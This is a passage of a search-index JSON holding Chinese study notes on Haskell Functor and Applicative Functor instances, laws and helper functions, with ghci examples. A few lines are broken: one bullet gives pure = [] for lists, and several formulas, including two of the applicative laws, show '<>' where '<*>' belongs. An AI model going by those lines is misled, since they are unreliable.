3]\n\"aaa\"\nghci&gt; [1, 2, 3] $&gt; 'a'\n\"aaa\"\n</code></pre></p>"},{"location":"cs/pl/haskell/#void","title":"void","text":"<p><code>void</code> \u51fd\u6570\u4e5f\u5305\u542b\u5728 <code>Data.Functor</code> \u6a21\u5757\u4e2d</p> <p>void :: Functor f =&gt; f a -&gt; f ()</p> <p>void \u51fd\u6570\u628a\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u5168\u90e8\u5143\u7d20\u90fd\u53d8\u6210\u7a7a\uff08<code>()</code>\uff09\uff0c<code>void x</code> \u76f8\u5f53\u4e8e <code>() &lt;$ x</code>\uff1a <pre><code>ghci&gt; void [1, 2, 3]\n[(), (), ()]\nghci&gt; void (Just 2)\nJust ()\n</code></pre></p>"},{"location":"cs/pl/haskell/#applicative-functor","title":"Applicative Functor","text":"<p>\u5e94\u7528\u51fd\u5b50\uff08Applicative Functor\uff09\u662f\u51fd\u5b50\u7684\u5347\u7ea7\u7248\uff0c\u5b83\u5305\u542b\u5728 <code>Control.Applicative</code> \u6a21\u5757\u4e2d\u3002</p> <p>fmap \u8fdb\u884c\u7684\u64cd\u4f5c\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u4e00\u5143\u51fd\u6570\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u3002\u800c\u5982\u679c\u8981\u5c06\u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\u5e94\u7528\u5728\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0cfmap \u5c31\u5904\u7406\u4e0d\u4e86\u4e86\uff0c\u4f46\u662f\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u6cd5\u53ef\u4ee5\u5904\u7406\u3002\u5e94\u7528\u51fd\u5b50\u7684\u5b9a\u4e49\uff1a <pre><code>class Functor f =&gt; Applicative f where\n    pure :: a -&gt; f a\n    (&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b\n</code></pre> \u5e94\u7528\u51fd\u5b50\u8981\u6c42\u5b9e\u73b0\u4e24\u4e2a\u51fd\u6570\uff1a</p> <ul> <li><code>pure</code> :: a -&gt; f a\uff0c\u4e0d\u96be\u7406\u89e3\uff0cpure \u63a5\u6536\u4e00\u4e2a\u503c\uff0c\u5e76\u5c06\u5176\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587/\u5bb9\u5668\u4e2d\u3002\u5bf9\u4e8e\u5217\u8868\uff0cpure = []\uff1b\u5bf9\u4e8e Maybe\uff0cpure = Just</li> <li><code>&lt;*&gt;</code> :: f (a -&gt; b) -&gt; f a -&gt; f b\uff0c\u7c7b\u4f3c\u4e8e fmap :: (a -&gt; b) -&gt; f a -&gt; f b\uff0c\u4f46\u4e0d\u540c\u7684\u662f &lt;*&gt; \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f f (a -&gt; b) \u4e0d\u662f a -&gt; b\u3002\u6240\u4ee5 &lt;*&gt; \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c&lt;*&gt; \u63a5\u6536\u4e00\u4e2a\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u548c\u53e6\u4e00\u4e2a\u51fd\u5b50\uff0c\u5e94\u7528\u51fd\u6570\u540e\u8fd4\u56de\u65b0\u7684\u51fd\u5b50\u3002</li> </ul>"},{"location":"cs/pl/haskell/#applicative-functor_1","title":"Applicative Functor \u5b9e\u4f8b","text":""},{"location":"cs/pl/haskell/#maybe_1","title":"Maybe","text":"<p>Maybe \u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a <pre><code>instance Applicative Maybe where\n    pure = Just\n    Nothing &lt;*&gt; _ = Nothing\n    (Just f) &lt;*&gt; something = fmap f something\n</code></pre></p> <ul> <li><code>pure</code> \u51fd\u6570\uff1a\u5c06\u4e00\u4e2a\u503c\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u800c\u5bf9\u4e8e Maybe\uff0c\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u5c31\u662f Just\uff0c\u6240\u4ee5 pure x = Just x</li> <li><code>&lt;*&gt;</code> \u51fd\u6570\uff1a\u5c06\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e2d<ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f Nothing\uff0c\u5373\u7b2c\u4e00\u4e2a\u51fd\u5b50\u4e0d\u5305\u542b\u51fd\u6570\uff0c\u90a3\u8fd4\u56de\u7684\u7ed3\u679c\u5c31\u4e5f\u4f1a\u662f Nothing</li> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u88c5\u6709\u51fd\u6570f\u7684\u51fd\u5b50 Just f\uff0c\u5c06\u5176\u4e2d\u7684\u51fd\u6570f\u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\uff0c\u53ea\u9700\u8981\u5c06 f \u63d0\u53d6\u51fa\u6765\u4f7f\u7528 fmap \u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\u5373\u53ef</li> </ul> </li> </ul> <p>\u5b9e\u9645\u5e94\u7528\u7684\u4f8b\u5b50\uff1a <pre><code>ghci&gt; Just (+3) &lt;*&gt; Just 9\nJust 12\nghci&gt; pure (+3) &lt;*&gt; Just 9\nJust 12\nghci&gt; (+3) &lt;$&gt; Just 9\nJust 12\nghci&gt; Nothing &lt;*&gt; Just 9\nNothing\n</code></pre> \u7b2c\u4e00\u4e2a\u4f8b\u5b50\uff0cJust (+3) \u662f\u4e00\u4e2a\u5305\u542b\u51fd\u6570 (+3) \u7684\u51fd\u5b50\uff0c\u5c06\u5176\u5e94\u7528\u5728\u51fd\u5b50 Just 9 \u4e2d\uff0c\u5c06 Just (+3) \u4e2d\u7684\u51fd\u6570 (+3) \u63d0\u53d6\u51fa\u6765\uff0c\u5e94\u7528\u5728 Just 9 \u4e2d\uff0c\u5f97\u5230\u4e86 Just 12</p> <p>\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5728\u8fd9\u91cc pure (+3) \u548c Just (+3) \u7b49\u6548\uff0c\u56e0\u4e3a pure \u5c06\u51fd\u6570 (+3) \u653e\u5728\u9ed8\u8ba4\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4e5f\u5c31\u662f Just \u4e2d\u4e86</p> <p>\u800c &lt;*&gt; \u80fd\u505a\u7684\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u4ed6\u53ef\u4ee5\u8fde\u7eed\u4f20\u5165\u66f4\u591a\u51fd\u5b50\u4f5c\u4e3a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a <pre><code>ghci&gt; pure (+) &lt;*&gt; Just 3 &lt;*&gt; Just 9\nJust 12\nghci&gt; pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3 &lt;*&gt; Just 4 &lt;*&gt; Just 5\nJust 12\n</code></pre> &lt;*&gt; \u51fd\u6570\u4e00\u6837\u662f\u9ed8\u8ba4\u5de6\u7ed3\u5408\u7684\uff0cpure (+) &lt;&gt; Just 3 &lt;&gt; Just 9 \u76f8\u5f53\u4e8e (pure (+) &lt;&gt; Just 3) &lt;&gt; Just 9\uff0c\u800c pure (+) &lt;&gt; Just 3 \u5c06 (+) \u5e94\u7528\u5728Just 3 \u4e0a\uff0c\u5f97\u5230\u7684\u5c31\u662f Just (+3) \u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\uff0c\u53c8\u5c06\u5176\u901a\u8fc7 &lt;&gt; \u5e94\u7528\u5728\u4e86 Just 9 \u4e0a\uff0c\u5f97\u5230\u4e86 Just 12: <pre><code>  pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3 &lt;*&gt; Just 4 &lt;*&gt; Just 5\n= (pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3) &lt;*&gt; Just 4 &lt;*&gt; Just 5\n= (Just (\\y z -&gt; 3 + y + z) &lt;*&gt; Just 4) &lt;*&gt; Just 5\n= Just (\\z -&gt; 3 + 4 + z) &lt;*&gt; Just 5 = Just (+7) &lt;*&gt; Just 5\n= Just 12\n</code></pre> \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c pure f &lt;&gt; x &lt;&gt; y &lt;*&gt; ... \u6765\u5c06\u4e00\u4e2a\u666e\u901a\u591a\u5143\u51fd\u6570f\u5e94\u7528\u5728\u591a\u4e2a\u51fd\u5b50\u4e0a\u3002</p> <p>\u800c\u4e14 pure f &lt;&gt; x \u5b9e\u9645\u4e0a\u5148\u5c06\u666e\u901a\u51fd\u6570f\u653e\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u6267\u884c &lt;&gt; \u65f6\u518d\u5c06\u5176\u63d0\u53d6\u51fa\u6765\u6267\u884c fmap\uff0c\u6240\u4ee5\u5b83\u5c31\u76f8\u5f53\u4e8e\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u51fd\u5b50 x \u4e0a\uff0c\u5373 fmap f x\uff0c\u4e5f\u53ef\u4ee5\u5199\u6210 f &lt;$&gt; x\u3002\u6240\u4ee5\u5e38\u7528\u7684\u5199\u6cd5\u5c31\u662f\uff1a</p> <p>f &lt;$&gt; x &lt;*&gt; y &lt;*&gt; ...</p>"},{"location":"cs/pl/haskell/#_13","title":"[]","text":"<p>\u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a <pre><code>instance Applicative [] where\n    pure x = [x]\n    fs &lt;*&gt; xs = [f x | f &lt;- fs, x &lt;- xs]\n</code></pre> - <code>pure</code> \u51fd\u6570\uff1a\u5bf9\u4e8e\u5217\u8868\u800c\u8a00\uff0c\u4e00\u4e2a\u503c\u7684\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u662f\u53ea\u5305\u542b\u8fd9\u4e2a\u503c\u7684\u5217\u8868 [x] - <code>&lt;*&gt;</code> \u51fd\u6570\uff1a\u5217\u8868\u7684 &lt;*&gt; \u51fd\u6570\u662f\u901a\u8fc7\u5217\u8868\u63a8\u5bfc\u6765\u5b9e\u73b0\u7684\u3002\u56e0\u4e3a\u4e0d\u540c\u4e8e Maybe \u7684 Just \u53ea\u5305\u542b\u4e00\u4e2a\u503c\uff0c\u5217\u8868\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u503c\uff0c\u7b2c\u4e00\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e2d\u53ef\u80fd\u4f1a\u5305\u542b\u5f88\u591a\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e5f\u4f1a\u5305\u542b\u5f88\u591a\u503c\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u5148\u4ece\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u53d6\u51fa\u4e00\u4e2a\u51fd\u6570\u7136\u540e\u4f9d\u6b21\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\uff0c\u518d\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\u2026\u2026\u6700\u7ec8\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7684\u5217\u8868</p> <p>\u4f7f\u7528\u4f8b\u5b50\uff1a <pre><code>ghci&gt; [(+3), (*2)] &lt;*&gt; [1, 2]\n[4,5,2,4]\nghci&gt; [(+), (*)]  &lt;*&gt;  [1, 2]  &lt;*&gt;  [3, 4]  \n[4, 5, 5, 6, 3, 4, 6, 8]\n</code></pre></p>"},{"location":"cs/pl/haskell/#io_2","title":"IO","text":"<p><pre><code>instance Applicative IO where\n    pure = return\n    a &lt;*&gt; b = do\n        f &lt;- a\n        x &lt;- b\n        return (f x)\n</code></pre> \u4e5f\u4e0d\u96be\u7406\u89e3\uff0cpure \u51fd\u6570\u76f4\u63a5\u5c06\u4f20\u5165\u7684\u503c return\uff0c\u76f8\u5f53\u4e8e\u653e\u5728\u4e86 IO \u7684\u4e0a\u4e0b\u6587\u4e2d\u3002\u800c &lt;*&gt; \u51fd\u6570\u5148\u5c06\u4e24\u4e2a IO \u4e2d\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5e94\u7528\u51fd\u6570\u540e return\uff0c\u5f62\u6210\u65b0\u7684 IO \u51fd\u5b50 <pre><code>ghci&gt; (++) &lt;$&gt; getLine &lt;*&gt; getLine\nLine1\nLine2\n\"Line1Line2\"\n</code></pre></p>"},{"location":"cs/pl/haskell/#-r_1","title":"(-&gt;) r","text":"<p>(-&gt;) r \u540c\u6837\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff0c\u548c\u51fd\u5b50\u7684\u5206\u6790\u4e00\u6837\uff0c\u5148\u6765\u5206\u6790\u5b83\u7684 &lt;*&gt; \u51fd\u6570\u7684\u7c7b\u578b\u7b7e\u540d\uff1a</p> <p>&lt;*&gt; :: f (a -&gt; b) -&gt; f a -&gt; f b</p> <p>\u5176\u4e2d f \u4e3a (-&gt;) r\uff0c\u5c06\u5176\u4ee3\u5165\u5e76\u66ff\u6362\u4e3a\u4e2d\u7f00\uff1a</p> <p>&lt;*&gt; :: (r -&gt; a -&gt; b) -&gt; (r -&gt; a) -&gt; (r -&gt; b)</p> <p>\u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -&gt; a -&gt; b\u3001g :: r -&gt; a\uff0c\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570 h :: (r -&gt; b)</p> <p>\u90a3\u4e48\u8fd4\u56de\u7684\u51fd\u6570\u7684\u8f93\u5165\u4e3a r\uff0c\u8f93\u51fa\u4e3a b\uff0c\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528\u51fd\u6570 g \u5f97\u5230 a\uff0c\u7136\u540e\u5728\u5bf9 r \u548c a \u5e94\u7528 f \u5f97\u5230 b\uff0c\u6240\u4ee5\u63a8\u6d4b &lt;*&gt; \u51fd\u6570\u7684\u64cd\u4f5c\u5c31\u662f\uff1a</p> <p>\\x -&gt; f x (g x)</p> <p>\u4e8e\u662f\uff1a <pre><code>instance Applicative ((-&gt;) r) where\n    pure x = (\\_ -&gt; x)\n    f &lt;*&gt; g = \\x -&gt; f x (g x)\n</code></pre> \u5c06\u4e00\u4e2a\u503c\u653e\u5728\u51fd\u6570\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u5e94\u8be5\u8fd4\u56de\u8fd9\u4e2a\u503c\u672c\u8eab\uff0c\u6240\u4ee5 pure \u51fd\u6570\u5b9a\u4e49\u4e3a (_ -&gt; x)\uff0c\u5373\u65e0\u8bba\u8f93\u5165\u4ec0\u4e48\uff0c\u90fd\u8fd4\u56de x</p> <p>\u5e94\u7528\u51fd\u5b50\u7684 &lt;*&gt; \u51fd\u6570\u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u5b50\u3002\u5bf9\u4e8e (-&gt;) r\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u3002\u5177\u4f53\u4f8b\u5b50\uff1a <pre><code>ghci&gt; (+) &lt;$&gt; (+3) &lt;*&gt; (*100) $ 5\n508\n</code></pre> \u6267\u884c\u8fd9\u53e5\u65f6\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f\uff1a <pre><code>  (+) &lt;$&gt; (+3) &lt;*&gt; (*100) $ 5\n= ((+) &lt;$&gt; (+3)) &lt;*&gt; (*100) $ 5\n= ((+) . (+3)) &lt;*&gt; (*100) $ 5 = (\\a -&gt; (+) ((+3) a)) &lt;*&gt; (*100) $ 5\n= (\\a b -&gt; (a + 3 + b)) &lt;*&gt; (*100) $ 5\n= (\\x -&gt; x + 3 + ((*100) x)) $ 5\n= (\\x -&gt; x + 3 + x * 100) $ 5\n= 5 + 3 + 5 * 100 = 508\n= (5 + 3) + (5 * 100)\n</code></pre> \u6240\u4ee5\u5c31\u76f8\u5f53\u4e8e\u5148\u5bf9\u8f93\u5165\u5206\u522b\u6267\u884c (+3) \u548c (*100)\uff0c\u7136\u540e\u5c06\u4e24\u4e2a\u7ed3\u679c\u6267\u884c\u4e86 (+)</p> <p>\u540c\u6837\uff1a <pre><code>ghci&gt; (\\x y z -&gt; [x,y,z]) &lt;$&gt; (+3) &lt;*&gt; (*2) &lt;*&gt; (/2) $ 5  \n[8.0,10.0,2.5]  \n</code></pre> \u5148\u5bf9 5 \u5206\u522b\u6267\u884c (+3)\u3001(*2)\u3001(/2)\uff0c\u7136\u540e\u5c06\u5f97\u5230\u7684\u4e09\u4e2a\u7ed3\u679c\u4f20\u5165 (\\x y z -&gt; [x,y,z]) \u5f97\u5230\u4e86\u6700\u7ec8\u7684\u7ed3\u679c</p> <pre><code>  f &lt;$&gt; g &lt;*&gt; h &lt;*&gt; i\n= (\\x -&gt; f (g x) (h x) (i x))\n</code></pre>"},{"location":"cs/pl/haskell/#ziplist","title":"ZipList","text":"<p>\u666e\u901a\u5217\u8868\u5b9e\u73b0\u7684 &lt;*&gt; \u51fd\u6570\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u6240\u6709\u503c\u4e0a\uff0c\u4f46\u8fd8\u6709\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u5bf9\u5e94\u503c\u4e0a\uff0c\u56e0\u4e3a\u540c\u4e00\u4e2a\u7c7b\u578b\u4e0d\u80fd\u5b58\u5728\u540c\u4e00\u51fd\u6570\u7684\u4e24\u79cd\u5b9e\u73b0\u5f62\u5f0f\uff0c\u6240\u4ee5\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u5217\u8868 ZipList\uff0c\u5305\u542b\u5728 <code>Control.Applicative</code> \u6a21\u5757\u4e2d <pre><code>instance Applicative ZipList where\n    pure x = ZipList (repeat x)\n    ZipList fs &lt;*&gt; ZipList xs = ZipList (zipWith ($) fs xs)\n</code></pre> \u4f46\u662f ZipList \u5e76\u4e0d\u662f Show \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u8981\u4f7f\u7528 <code>getZipList</code> \u6765\u83b7\u53d6\u5b83\u5185\u90e8\u7684\u5217\u8868\uff1a <pre><code>ghci&gt; getZipList $ (+) &lt;$&gt; ZipList [1,2,3] &lt;*&gt; ZipList [100,100..]  \n[101,102,103]\nghci&gt; getZipList $ (,,) &lt;$&gt; ZipList \"dog\" &lt;*&gt; ZipList \"cat\" &lt;*&gt; ZipList \"rat\"  \n[('d','c','r'),('o','a','a'),('g','t','t')]  \n</code></pre></p>"},{"location":"cs/pl/haskell/#applicative-functor-laws","title":"Applicative Functor Laws","text":"<p>\u5e94\u7528\u51fd\u5b50\u4e00\u822c\u6709\u56db\u4e2a\u5b9a\u5f8b\uff0c\u90fd\u662f\u4fdd\u8bc1 pure \u7684\u6b63\u786e\u6027\u7684\uff1a</p> <ol> <li><code>Identity law</code>\uff1apure id &lt;*&gt; v = v</li> <li><code>Homomorphism</code>\uff1apure f &lt;*&gt; pure x = pure (f x)</li> <li><code>Interchange</code>\uff1au &lt;&gt; pure v = pure ($ v) &lt;&gt; u</li> <li><code>Composition</code>\uff1au &lt;&gt; (v &lt;&gt; w) = pure (.) &lt;&gt; u &lt;&gt; v &lt;*&gt; w</li> </ol>"},{"location":"cs/pl/haskell/#intuition_1","title":"Intuition","text":"<p>\u7406\u89e3\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u5f0f\u4e5f\u662f\u5c06\u5176\u770b\u4f5c\u662f\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff0c\u6bd4\u5982\u8981\u8ba1\u7b97\uff1a</p> \\[ [[\\ \\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ \\ ]] \\] <p>\u5176\u4e2d \\(x_i\\) \u7684\u7c7b\u578b\u662f \\(f\\ t_i\\)\uff0c\\(f\\) \u662f\u5e94\u7528\u51fd\u5b50\uff08\u770b\u4f5c\u4e0a\u4e0b\u6587\uff09\u3002\u800c\u51fd\u6570 \\(g\\) \u7684\u7c7b\u578b\u662f\uff1a</p> \\[ t_1\\to t_2\\to\\cdots\\to t_n\\to t \\] <p>\u6240\u4ee5\u53cc\u62ec\u53f7\uff08idiom brackets\uff09\u7684\u4f5c\u7528\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\u3002\\(g\\ x_1\\) \u53ef\u4ee5\u901a\u8fc7 fmap \u6765\u6267\u884c\uff0c\u5c06 \\(g\\) \u63d0\u5347\uff08lift\uff09\u5230 \\(x_1\\) \u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u5e94\u7528\u5728 \\(x_1\\) \u4e0a\u3002\u4f46\u662f fmap \u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\\(g\\ x_1\\) \u7ed3\u679c\u7684\u7c7b\u578b\u662f\uff1a</p> \\[ f\\ \\ (t_2\\to t_3\\to\\cdots\\to t_n\\to t) \\] <p>\u4f46\u662f fmap \u5e76\u4e0d\u80fd\u5c06\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\uff0c\u4e8e\u662f\u5e94\u7528\u51fd\u5b50\u7684 &lt;*&gt; \u51fd\u6570\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u6240\u4ee5\u8ba1\u7b97 \\([[\\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ ]]\\)\uff0c\u53ea\u9700\u8981\uff1a</p> <p>g &lt;$&gt; x1 &lt;*&gt; x2 &lt;*&gt; ... &lt;*&gt; xn</p> <p>\u800c pure \u51fd\u6570\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u4e00\u4e2a\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\uff08\u51fd\u6570\u6216\u53c2\u6570\uff09\u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4f46\u4e0d\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002\u6bd4\u5982\u53c2\u6570 \\(x_2\\) \u5982\u679c\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u9700\u8981\u7528 pure \u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\u624d\u80fd\u6309\u4e0a\u9762\u8ba1\u7b97\uff1a</p> <p>g &lt;$&gt; x1 &lt;*&gt; pure x2 &lt;*&gt; ... &lt;*&gt; xn</p>"},{"location":"cs/pl/haskell/#_14","title":"\u5e38\u7528\u51fd\u6570","text":""},{"location":"cs/pl/haskell/#lifta-lifta2-lifta3","title":"liftA &amp; liftA2 &amp; liftA3","text":"<p>liftA :: Applicative f =&gt; (a -&gt; b) -&gt; f a -&gt; f b</p> <p>liftA2 :: Applicative f =&gt; (a -&gt; b -&gt; c) -&gt; f a -&gt; f b -&gt; f c</p> <p>liftA3 :: Applicative f =&gt; (a -&gt; b -&gt; c -&gt; d) -&gt; f a -&gt; f b -&gt; f c -&gt; f d</p> <p>\u4e0d\u96be\u63a8\u6d4b liftA \u5c31\u662f fmap\uff0c<code>liftA2 f x1 x2</code> \u76f8\u5f53\u4e8e <code>f &lt;$&gt; x1 &lt;*&gt; x2</code>\uff0c<code>liftA3 f x1 x2 x3</code> \u76f8\u5f53\u4e8e <code>f &lt;$&gt; x1 &lt;*&gt; x2 &lt;*&gt; x3</code></p>"},{"location":"cs/pl/haskell/#_15","title":"&lt;* &amp; *&gt;","text":"<p>\u7c7b\u578b\u7c7b\u4f3c\u51fd\u5b50\u7684 <code>&lt;$</code> \u548c <code>$&gt;</code>\uff1a</p> <p>(&lt;*) :: Applicative f =&gt; f a -&gt; f b -&gt; f a</p> <p>(*&gt;) :: Applicative f =&gt; f a -&gt; f b -&gt; f b</p> <p>&lt;* \u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u5982\u679c\u4e24\u4e2a\u51fd\u5b50\u4e2d\u53c8\u4e00\u4e2a\u4e3a\u7a7a\uff0c\u5c31\u8fd4\u56de\u7a7a\uff0c\u5426\u5219\u8fd4\u56de\u7684\u7c7b\u578b\u4e0e\u7b2c\u4e00\u4e2a\u51fd\u5b50\u76f8\u540c\u3002*&gt; \u53cd\u8fc7\u6765 <pre><code>ghci&gt; Just 3 &lt;* Just 4\nJust 3\nghci&gt; Just 3 *&gt; Just 4\nJust 4\nghci&gt; Nothing &lt;* Just 3\nNothing\nghci&gt; Nothing *&gt; Just 3\nNothing\nghci&gt; [1, 2, 3] &lt;* [3, 4]\n[1,1,2,2,3,3]\nghci&gt; [1, 2, 3] *&gt; [3, 4]\n[3,4,3,4,3,4]\nghci&gt; [] &lt;* [1, 2, 3]\n[]\nghci&gt; [] *&gt; [1, 2, 3]\n[]\n</code></pre></p>"},{"location":"cs/pl/haskell/#_16","title":"&lt;**&gt;","text":"<p>(&lt;**&gt;) :: Applicative f =&gt; f a -&gt; f (a -&gt; b) -&gt; f b</p> <p>\u63a5\u6536\u7684\u53c2\u6570\u662f &lt;*&gt; \u53cd\u8f6c\u8fc7\u6765\u7684\uff0c\u5373\u5148\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u51fd\u5b50\uff0c\u7136\u540e\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u51fd\u5b50\uff0c\u5728\u5c06\u5176\u5e94\u7528\u8fd4\u56de\u3002\u4f46\u662f\u548c flip(&lt;*&gt;) \u4e0d\u540c\uff0c\u5b83\u5148\u53d6\u53c2\u6570\u51fd\u5b50\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u7136\u540e\u518d\u53d6\u51fd\u6570\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u9010\u4e2a\u5e94\u7528\uff1a <pre><code>ghci&gt; [(+1), (+2), (+3)] &lt;*&gt; [1, 2]\n[2,3,3,4,4,5]\nghci&gt; [1, 2] &lt;**&gt; [(+1), (+2), (+3)]\n[2,3,4,3,4,5]\nghci&gt; flip(&lt;*&gt;) [1, 2] [(+1), (+2), (+3)]\n[2,3,3,4,4,5]\n</code></pre></p>"},{"location":"cs/pl/haskell/#when-unless","title":"when &amp; unless","text":"<p>when :: Applicative f =&gt; Bool -&gt; f () -&gt; f ()</p> <p>\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u662f\u4e00\u4e2a\u7ed3\u679c\u4e3a Bool \u7c7b\u578b\u7684\u6d4b\u8bd5\uff0c\u5982\u679c\u6d4b\u8bd5\u4e3a True\uff0c\u5219\u8c03\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5426\u5219\u8fd4\u56de pure ()\u3002\uff08when \u51fd\u6570\u5728\u4e0a\u6587 IO \u64cd\u4f5c\u4e2d\u4f7f\u7528\u8fc7\uff09</p> <p>unless \u5219\u4e0e when \u76f8\u53cd\uff0c\u6d4b\u8bd5\u4e3a True \u8fd4\u56de pure ()</p>"},{"location":"cs/pl/haskell/#sequencea","title":"sequenceA","text":"<p>sequenceA :: (Traversable t, Applicative f) =&gt; t (f a) -&gt; f (t a)</p> <p>\u5e94\u7528\u5728\u5217\u8868\u4e0a\u65f6\uff0c\u5b83\u7684\u7c7b\u578b\u76f8\u5f53\u4e8e\uff1a</p> <p>[f a] -&gt; f [a]</p> <p>\u6240\u4ee5\u5728\u5217\u8868\u4e0a\u5b83\u7684\u4f7f\u7528\u65b9\u6cd5\uff1a <pre><code>ghci&gt; sequenceA [Just 3, Just 2, Just 1]  \nJust [3,2,1]  \nghci&gt; sequenceA [Just 3, Nothing, Just 1]  \nNothing  \nghci&gt; sequenceA [(+3),(+2),(+1)] 3  \n[6,5,4]  \nghci&gt; sequenceA [[1,2,3],[4,5,6]]  \n[[1,4],[1,5],[1,6],[2,4],[2,5],[2,6],[3,4],[3,5],[3,6]]  \nghci&gt; sequenceA [[1,2,3],[4,5,6],[3,4,4],[]]  \n[]  \n</code></pre> \u5b83\u5728\u5bf9\u540c\u4e00\u4e2a\u53c2\u6570\u5e94\u7528\u4e0d\u540c\u51fd\u6570\u65f6\u5f88\u6709\u7528\uff1a <pre><code>ghci&gt; map (\\f -&gt; f 7) [(&gt;4), 